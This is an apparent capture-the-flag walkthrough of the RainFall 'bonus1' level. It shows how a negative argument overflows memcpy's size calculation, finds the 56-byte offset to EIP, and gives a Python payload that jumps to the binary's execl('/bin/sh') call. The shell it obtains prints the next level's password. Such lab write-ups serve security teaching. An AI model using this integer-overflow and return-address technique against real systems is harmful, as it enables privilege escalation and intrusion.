Same as usual, we export the executable for decompilation:

```nasm
➜  ~ scp -P 4242 bonus1@0.0.0.0:/home/user/bonus1/bonus1 .
	  _____       _       ______    _ _ 
	 |  __ \     (_)     |  ____|  | | |
	 | |__) |__ _ _ _ __ | |__ __ _| | |
	 |  _  /  _` | | '_ \|  __/ _` | | |
	 | | \ \ (_| | | | | | | | (_| | | |
	 |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on 10.0.2.15:4242
bonus1@0.0.0.0's password: 
bonus1                                        100% 5043     3.2MB/s   00:00
```

The decompiled version of the code:

```c
int main(int argc, char **argv)

{
  int ret_value;
  char buff [40];
  int x;
  
  x = atoi(*(char **)(argv[1]));
  if (x < 10) {
    memcpy(buff,*(void **)(argv[2]), x * 4);
    if (x == 0x574f4c46) {
      execl("/bin/sh","sh",0);
    }
    ret_value = 0;
  }
  else {
    ret_value = 1;
  }
  return ret_value;
}
```

We can see that it's not possible to set a specific value for x since it must be less than 10 to enter the first condition and equal to 1464814262 (0x574f4c46) to trigger the shell.

We also see that memcpy uses x * 4 as its size, which means that in normal usage of the code, we can only copy 9 * 4 = 36 characters, which is insufficient to overflow the buffer with a size of 40.

However, what happens if we add a negative value as the first argument, like -1?

```c
bonus1@RainFall:~$ ltrace ./bonus1 -1 abcdefgh
__libc_start_main(0x8048424, 3, 0xbffff794, 0x80484b0, 0x8048520 <unfinished ...>
atoi(0xbffff8c2, 0x8049764, 3, 0x80482fd, 0xb7fd13e4)         = -1
memcpy(0xbffff6c4, "abcdefgh", 4294967292 <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

We can see that the size of memcpy is now set to 4294967292! This is the value of the maximum unsigned int on a 32-bit system.

Remember that memcpy has the following prototype:

```
void *memcpy(void *dest, const void *src, size_t n);
```

In this case, if we reverse the values of the size inside memcpy, we just need to take -4294967292 / 4 = -1073741823, since x is multiplied by 4 as an argument:

```c
bonus1@RainFall:~$ ltrace ./bonus1 -1073741823 abcdefgh
__libc_start_main(0x8048424, 3, 0xbffff794, 0x80484b0, 0x8048520 <unfinished ...>
atoi(0xbffff8b9, 0x8049764, 3, 0x80482fd, 0xb7fd13e4)         = 0xc0000001
memcpy(0xbffff6c4, "abcd", 4)                                 = 0xbffff6c4
+++ exited (status 0) +++
```

This time, we can see that the parameter size of memcpy is set to 4, which is equivalent to 1 * 4. So, to increase the size of memcpy, we just need to gradually subtract the value -1073741823.

`-1073741822` will result in a size of `8`

`-1073741821` will result in a size of `12`

etc... until exceeding the buffer size of 40.

We can see from ltrace that the segfault occurs starting from `-1073741809`:

```c
bonus1@RainFall:~$ ltrace ./bonus1 -1073741814 abcdefgh
__libc_start_main(0x8048424, 3, 0xbffff794, 0x80484b0, 0x8048520 <unfinished ...>
atoi(0xbffff8b9, 0x8049764, 3, 0x80482fd, 0xb7fd13e4)         = 0xc000000a
memcpy(0xbffff6c4, "abcdefgh", 40)                            = 0xbffff6c4
+++ exited (status 0) +++
bonus1@RainFall:~$ ltrace ./bonus1 -1073741813 abcdefgh
__libc_start_main(0x8048424, 3, 0xbffff794, 0x80484b0, 0x8048520 <unfinished ...>
atoi(0xbffff8b9, 0x8049764, 3, 0x80482fd, 0xb7fd13e4)         = 0xc000000b
memcpy(0xbffff6c4, "abcdefgh", 44)                            = 0xbffff6c4
+++ exited (status 0) +++
bonus1@RainFall:~$ ltrace ./bonus1 -1073741812 abcdefgh
__libc_start_main(0x8048424, 3, 0xbffff794, 0x80484b0, 0x8048520 <unfinished ...>
atoi(0xbffff8b9, 0x8049764, 3, 0x80482fd, 0xb7fd13e4)         = 0xc000000c
memcpy(0xbffff6c4, "abcdefgh", 48)                            = 0xbffff6c4
+++ exited (status 0) +++
bonus1@RainFall:~$ ltrace ./bonus1 -1073741811 abcdefgh
__libc_start_main(0x8048424, 3, 0xbffff794, 0x80484b0, 0x8048520 <unfinished ...>
atoi(0xbffff8b9, 0x8049764, 3, 0x80482fd, 0xb7fd13e4)         = 0xc000000d
memcpy(0xbffff6c4, "abcdefgh", 52)                            = 0xbffff6c4
+++ exited (status 0) +++
bonus1@RainFall:~$ ltrace ./bonus1 -1073741810 abcdefgh
__libc_start_main(0x8048424, 3, 0xbffff794, 0x80484b0, 0x8048520 <unfinished ...>
atoi(0xbffff8b9, 0x8049764, 3, 0x80482fd, 0xb7fd13e4)         = 0xc000000e
memcpy(0xbffff6c4, "abcdefgh", 56)                            = 0xbffff6c4
+++ exited (status 0) +++
bonus1@RainFall:~$ ltrace ./bonus1 -1073741809 abcdefgh
__libc_start_main(0x8048424, 3, 0xbffff794, 0x80484b0, 0x8048520 <unfinished ...>
atoi(0xbffff8b9, 0x8049764, 3, 0x80482fd, 0xb7fd13e4)         = 0xc000000f
memcpy(0xbffff6c4, "abcdefgh", 60)                            = 0xbffff6c4
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

So, we can deduce that EIP eventually gets rewritten after 56 characters.

Let's confirm this with gdb:

```c
Starting program: /home/user/bonus1/bonus1 -1073741809 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x39624138 in ?? ()
```

Indeed, the offset is set to 56.

Now that we know how to rewrite EIP, we need to know the address to which it should be redirected. There is no need to use a shellcode for this program since it already invokes /bin/sh. We just need to find the address of the instruction that triggers the execl bin/sh call.

We want to go to address `0x08048482`, which is the instruction for loading the shell:

```nasm
 8048482:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp) ; <----
 8048489:	00 
 804848a:	c7 44 24 04 80 85 04 	movl   $0x8048580,0x4(%esp)
 8048491:	08 
 8048492:	c7 04 24 83 85 04 08 	movl   $0x8048583,(%esp)
 8048499:	e8 b2 fe ff ff       	call   8048350 <execl@plt>
```

And here is the payload:

```nasm
bonus1@RainFall:~$ ./bonus1 -1073741809 $(python -c 'print "A" * 56 + "\x82\x84\x04\x08"')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```